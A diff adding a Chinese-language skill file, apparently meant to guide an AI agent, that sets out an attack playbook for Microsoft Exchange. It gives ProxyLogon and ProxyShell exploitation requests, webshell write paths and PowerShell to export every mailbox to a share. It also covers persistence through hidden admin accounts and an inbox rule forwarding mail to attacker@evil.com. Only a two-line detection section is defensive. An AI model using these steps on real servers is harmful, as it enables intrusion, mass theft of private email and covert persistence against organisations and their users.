@@ -1,0 +1,147 @@
+---
+name: exchange-attack-exchange
+description: Use when encountering microsoft exchange服务器漏洞利用 - proxylogon/proxyshell/rce
+---
+
+# Exchange攻击
+
+## Info
+
+- **Domain**: intranet
+- **Tags**: intranet, exchange, microsoft, proxylogon, proxyshell
+
+## 攻击思路
+```
+版本识别 → 漏洞探测 → ProxyLogon/ProxyShell → RCE/数据窃取
+```
+
+## 系统识别
+
+| 特征 | 值 |
+|------|-----|
+| URL | /owa/, /ecp/, /autodiscover/ |
+| Header | X-FEServer, X-AspNet-Version |
+| NTLM | WWW-Authenticate: NTLM |
+
+```bash
+# 识别Exchange版本
+curl -I https://mail.target.com/owa/
+curl -I https://mail.target.com/autodiscover/autodiscover.xml
+```
+
+## 关键漏洞矩阵
+
+| CVE | 漏洞名 | 类型 | CVSS |
+|-----|--------|------|------|
+| CVE-2021-26855 | ProxyLogon | SSRF | 9.8 |
+| CVE-2021-27065 | ProxyLogon | RCE | 9.8 |
+| CVE-2021-34473 | ProxyShell | SSRF | 9.8 |
+| CVE-2021-34523 | ProxyShell | 提权 | - |
+| CVE-2021-31207 | ProxyToken | 认证绕过 | - |
+| CVE-2020-17083 | - | RCE | 8.8 |
+
+## ProxyLogon攻击
+
+```
+攻击链:
+1. CVE-2021-26855: SSRF访问内部邮箱
+2. CVE-2021-27065: 写入WebShell
+```
+
+```bash
+# 自动化工具
+python3 proxylogon.py user:password@mail.target.com
+
+# 手动利用
+# Step1: SSRF获取邮箱内容
+curl -k "https://mail.target.com/owa/auth/x.js" \
+  -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;"
+
+# Step2: 写入WebShell
+POST /ecp/DDI/DDIService.svc/SetObject
+```
+
+## ProxyShell攻击
+
+```
+攻击链:
+1. CVE-2021-34473: SSRF绕过认证
+2. CVE-2021-34523: 提升权限
+3. CVE-2021-31207: 写入WebShell
+```
+
+```bash
+# 自动化工具
+python3 proxyshell.py -u user@target.com
+
+# 检测脚本
+curl -k "https://mail.target.com/autodiscover/autodiscover.json?user@target.com&Protocol=Autodiscover"
+```
+
+## 信息收集
+
+| 信息 | 获取方法 |
+|------|----------|
+| 邮箱列表 | PowerShell: Get-Mailbox |
+| 域用户 | PowerShell: Get-ADUser |
+| 组织信息 | /owa/service.svc |
+
+```powershell
+# Exchange PowerShell
+Get-Mailbox -ResultSize Unlimited
+Get-MailboxStatistics -Identity user@domain.com
+Get-ADUser -Filter * -Properties mail
+```
+
+## 邮箱导出
+
+```powershell
+# 导出邮箱
+New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
+
+# 查看导出状态
+Get-MailboxExportRequest
+
+# 导出所有邮箱
+Get-Mailbox | %{New-MailboxExportRequest -Mailbox $_.alias -FilePath "\\server\share\$($_.alias).pst"}
+```
+
+## WebShell植入
+
+| 路径 | 说明 |
+|------|------|
+/owa/auth/current/themes/ | 常用WebShell路径 |
+/ecp/DDI/ | 通过DDI服务写入 |
+/aspnet_client/ | 另一个写入点 |
+
+```bash
+# ProxyLogon写入WebShell
+写入路径: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\
+访问: https://mail.target.com/owa/auth/shell.aspx
+```
+
+## 后门技术
+
+| 方法 | 说明 |
+|------|------|
+| 收件箱规则 | 自动转发敏感邮件 |
+| 传输规则 | 邮件拦截 |
+| 代理账户 | 创建隐藏管理员 |
+
+```powershell
+# 创建转发规则
+New-InboxRule -Name "Forward" -ForwardTo attacker@evil.com
+
+# 检查规则
+Get-InboxRule -Mailbox user@domain.com
+```
+
+## 攻击检测
+
+```bash
+# 检测ProxyLogon
+检查IIS日志: /owa/auth/ 目录异常访问
+
+# 检测ProxyShell
+检查Autodiscover服务异常请求
+```
